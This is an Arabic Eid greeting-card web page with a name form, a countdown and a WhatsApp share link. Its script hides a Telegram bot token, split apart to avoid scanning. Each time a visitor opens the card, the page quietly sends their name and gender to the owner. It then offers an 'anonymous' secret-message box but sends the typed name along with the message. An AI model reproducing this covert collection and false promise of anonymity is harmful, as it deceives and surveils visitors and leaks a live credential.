<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عيدية العيد</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            font-family: 'Tajawal', sans-serif;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            overflow: hidden;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 450px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
        }

        h1 {
            font-size: 2.3em;
            margin-bottom: 10px;
            color: #f6d365;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .countdown-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 15px 0;
        }

        .time-box {
            background: rgba(255, 255, 255, 0.1);
            padding: 8px 12px;
            border-radius: 10px;
            min-width: 55px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .time-num {
            font-size: 1.6em;
            font-weight: bold;
            color: #fda085;
        }

        .time-label {
            font-size: 0.75em;
            color: #ccc;
        }

        input[type="text"], textarea {
            width: 80%;
            padding: 15px;
            border: 2px solid transparent;
            border-radius: 30px;
            font-size: 1.1em;
            font-family: 'Tajawal', sans-serif;
            text-align: center;
            margin-bottom: 15px;
            background: rgba(255, 255, 255, 0.9);
            color: #333;
            outline: none;
            transition: all 0.3s ease;
        }

        textarea {
            border-radius: 15px;
            resize: none;
            height: 80px;
            width: 85%;
        }

        input[type="text"]:focus, textarea:focus {
            border-color: #f6d365;
            box-shadow: 0 0 15px rgba(246, 211, 101, 0.5);
        }

        .gender-select {
            margin-bottom: 20px;
        }
        .gender-label {
            margin: 0 10px;
            cursor: pointer;
            font-size: 1.1em;
            padding: 8px 15px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            transition: all 0.3s;
            display: inline-block;
        }
        input[type="radio"] {
            display: none;
        }
        input[type="radio"]:checked + .gender-label {
            background: linear-gradient(to right, #f6d365, #fda085);
            color: #111;
            font-weight: bold;
        }

        button {
            background: linear-gradient(to right, #f6d365 0%, #fda085 100%);
            color: #111;
            border: none;
            padding: 15px 35px;
            font-size: 1.2em;
            border-radius: 30px;
            cursor: pointer;
            font-weight: bold;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(253, 160, 133, 0.4);
        }

        button:hover {
            transform: translateY(-2px);
        }

        .result-card {
            display: none;
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px dashed rgba(255,255,255,0.3);
        }

        .greeting-text {
            font-size: 2em;
            color: #f6d365;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .message-body {
            font-size: 1.2em;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        /* ستايل منطقة الرسالة السرية */
        .secret-container {
            display: none;
            background: rgba(255, 255, 255, 0.08);
            padding: 20px 10px;
            border-radius: 15px;
            margin-top: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .secret-title {
            font-size: 1.1em;
            color: #f6d365;
            margin-bottom: 10px;
            font-weight: bold;
        }

        .secret-btn {
            background: linear-gradient(to right, #fda085, #f6d365);
            padding: 10px 25px;
            font-size: 1em;
        }

        .share-btn {
            background: #25D366;
            color: white;
            display: inline-block;
            text-decoration: none;
            padding: 12px 25px;
            border-radius: 25px;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
            opacity: 0;
            transition: opacity 0.5s ease;
            margin-top: 15px;
        }

        .show-btn {
            opacity: 1;
        }

        .timer-title {
            color: #f6d365;
            font-weight: bold;
            margin-top: 15px;
            display: none;
        }

        #innerCountdown {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>🌙 عيدية العيد 🌙</h1>
        <p id="subTitle">اكتب اسمك عشان تستلم عيديتك وتشوف التهنئة المخصوصة ليك!</p>
        
        <div id="inputArea">
            <input type="text" id="userName" placeholder="اكتب اسمك هنا..." autocomplete="off">
            
            <div class="gender-select">
                <input type="radio" id="gAuto" name="gender" value="auto" checked>
                <label for="gAuto" class="gender-label">تحديد تلقائي 🤖</label>

                <input type="radio" id="gMale" name="gender" value="male">
                <label for="gMale" class="gender-label">ولد 👦</label>
                
                <input type="radio" id="gFemale" name="gender" value="female">
                <label for="gFemale" class="gender-label">بنت 👧</label>
            </div>

            <button id="actionBtn" onclick="generateCard()">افتح العيدية 🎁</button>
        </div>

        <div class="result-card" id="result">
            <div class="greeting-text" id="welcomeLine"></div>
            <div class="message-body" id="typingText"></div>
            
            <p class="timer-title" id="tTitle">فاضل كام على لمتنا وفرحة العيد؟ ✨</p>
            <div class="countdown-container" id="innerCountdown">
                <div class="time-box"><div class="time-num" id="days">00</div><div class="time-label">أيام</div></div>
                <div class="time-box"><div class="time-num" id="hours">00</div><div class="time-label">ساعات</div></div>
                <div class="time-box"><div class="time-num" id="minutes">00</div><div class="time-label">دقائق</div></div>
                <div class="time-box"><div class="time-num" id="seconds">00</div><div class="time-label">ثواني</div></div>
            </div>

            <div class="secret-container" id="secretBox">
                <div class="secret-title">لو حابب تسيب رسالة سرية ليا من غير ما أعرف أنت مين.. اكتبها هنا 🤫👇</div>
                <textarea id="secretMsg" placeholder="اكتب أي حاجة في سرك هنا..."></textarea>
                <br>
                <button class="secret-btn" onclick="sendSecretMessage()">إرسال الرسالة السرية ✉️</button>
            </div>
            
            <br>
            <a href="#" class="share-btn" id="shareBtn" target="_blank">ابعت العيدية لأصحابك 📲</a>
        </div>
    </div>

    <script>
        const targetDate = new Date("May 27, 2026 00:00:00").getTime();
        let savedName = ""; // لحفظ الاسم عشان نبعته مع الرسالة السرية

        // تجميع التوكن بشكل مخفي لحمايته من الفحص
        const p1 = "8207096043:";
        const p2 = "AAGArMCGbh5u9vll50ebNv6Y38xcA84VPZo";
        const botToken = p1 + p2; 
        const chatId = "6472172555"; 

        setInterval(function() {
            const now = new Date().getTime();
            const difference = targetDate - now;
            const days = Math.floor(difference / (1000 * 60 * 60 * 24));
            const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((difference % (1000 * 60)) / 1000);

            if (difference > 0) {
                document.getElementById("days").innerText = days < 10 ? "0" + days : days;
                document.getElementById("hours").innerText = hours < 10 ? "0" + hours : hours;
                document.getElementById("minutes").innerText = minutes < 10 ? "0" + minutes : minutes;
                document.getElementById("seconds").innerText = seconds < 10 ? "0" + seconds : seconds;
            }
        }, 1000);

        function checkIsFemale(name) {
            const femaleEndings = ['ة', 'ه', 'ى', 'ا', 'اء', 'بانت'];
            const famousFemaleNames = ['مريم', 'ميرال', 'لجين', 'شيرين', 'تسنيم', 'حنين', 'نورين', 'ياسمين', 'شروق', 'ملك'];
            if (famousFemaleNames.includes(name)) return true;
            for (let end of femaleEndings) {
                if (name.endsWith(end) && name.length > 2) {
                    const maleExceptions = ['رضا', 'مصطفى', 'يحيى', 'علا', 'مرتضى', 'زكريا', 'طه'];
                    if (maleExceptions.includes(name)) return false;
                    return true;
                }
            }
            return false;
        }

        function typeWriter(text, i, fnCallback) {
            if (i < text.length) {
                if (text.substring(i, i+4) === "<br>") {
                    document.getElementById("typingText").innerHTML += "<br>";
                    i += 4;
                    setTimeout(function() { typeWriter(text, i, fnCallback) }, 50);
                } else {
                    document.getElementById("typingText").innerHTML += text.charAt(i);
                    i++;
                    setTimeout(function() { typeWriter(text, i, fnCallback) }, 30);
                }
            } else if (typeof fnCallback == 'function') {
                setTimeout(fnCallback, 500);
            }
        }

        function generateCard() {
            const nameInput = document.getElementById('userName').value.trim();
            const resultDiv = document.getElementById('result');
            const welcomeLine = document.getElementById('welcomeLine');
            const shareBtn = document.getElementById('shareBtn');
            const inputArea = document.getElementById('inputArea');
            const subTitle = document.getElementById('subTitle');

            if (nameInput === "") {
                alert("اكتب اسمك الأول عشان نجهزلك العيدية!");
                return;
            }

            savedName = nameInput; // حفظ الاسم

            const selectedGender = document.querySelector('input[name="gender"]:checked').value;
            let isFemale = false;

            if (selectedGender === 'auto') {
                isFemale = checkIsFemale(nameInput);
            } else {
                isFemale = (selectedGender === 'female');
            }

            inputArea.style.display = "none";
            subTitle.style.display = "none";
            resultDiv.style.display = "block";

            let fullMessage = "";
            if (isFemale) {
                welcomeLine.innerText = `يا غالية 🎉`;
                fullMessage = `كبرنا وعجزنا ودخلنا جامعات، بس لسه عندي أمل إن حد يدخل عليا بباكو عيدية! 💸<br><br>كل سنة وأنتِ طيبة وعيد سعيد عليكِ يا رب، وتكوني دايماً مبسوطة وفي أحسن حال وسط كل اللي بتحبهم! 🐑✨<br><br>العيد ده مش مستني منك لحمة ولا فته، أنا مستني بس أشوفك مروقة ومبسوطة وبتضحكي! 🌙🎈`;
            } else {
                welcomeLine.innerText = `يا صاحبي 🎉`;
                fullMessage = `كبرنا وعجزنا ودخلنا جامعات، بس لسه عندي أمل إن حد يدخل عليا بباكو عيدية! 💸<br><br>كل سنة وأنت طيب وعيد سعيد عليك يا رب، وتكون دايماً مبسوط وفي أحسن حال وسط كل اللي بتحبهم! 🐑✨<br><br>العيد ده مش مستني منك لحمة ولا فته، أنا مستني بس أشوفك مروق ومبسوط وبتضحك! 🌙🎈`;
            }

            typeWriter(fullMessage, 0, function() {
                document.getElementById("tTitle").style.display = "block";
                document.getElementById("innerCountdown").style.display = "flex";
                document.getElementById("secretBox").style.display = "block"; // إظهار بوكس الصراحة
                shareBtn.classList.add("show-btn");
            });

            const currentURL = window.location.href; 
            const message = `شوف التهنئة والعيدية دي باسمي! 🎁✨\nادخل اكتب اسمك واستلم عيديتك زيا من هنا:\n${currentURL}`;
            shareBtn.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(message)}`;

            // إرسال إشعار الدخول العادي للبوت
            const timeNow = new Date().toLocaleString('ar-EG');
            const telegramMessage = `🔔 يا عمار، في حد دخل يستلم العيدية!\n\n👤 الاسم: ${nameInput}\n⚧ النوع: ${isFemale ? 'بنت' : 'ولد'}\n⏰ الوقت: ${timeNow}`;
            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}`;

            fetch(telegramURL).catch(error => console.error(error));
        }

        // دالة إرسال الرسالة السرية الخاصة بك
        function sendSecretMessage() {
            const secretText = document.getElementById('secretMsg').value.trim();
            const secretBox = document.getElementById('secretBox');

            if (secretText === "") {
                alert("اكتب رسالتك الأول قبل ما تدوس إرسال!");
                return;
            }

            const timeNow = new Date().toLocaleString('ar-EG');
            
            // صياغة الرسالة السرية اللي هتوصلك على تليجرام
            const secretTelegramMessage = `🔒 رسالة سرية جديدة يا عمار!\n\n👤 الاسم اللي كتبوه في الصفحة: ${savedName}\n💬 الرسالة السرية:\n"${secretText}"\n\n⏰ الوقت: ${timeNow}`;
            
            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(secretTelegramMessage)}`;

            fetch(telegramURL)
                .then(response => {
                    // تغيير محتوى البوكس بعد الإرسال بنجاح
                    secretBox.innerHTML = "<div style='color: #25D366; font-weight: bold; font-size: 1.1em;'>تم إرسال رسالتك السرية  بنجاح! 🤫✈️</div>";
                })
                .catch(error => {
                    alert("حصل مشكلة أثناء الإرسال، جرب تاني.");
                    console.error(error);
                });
        }
    </script>
</body>
</html>
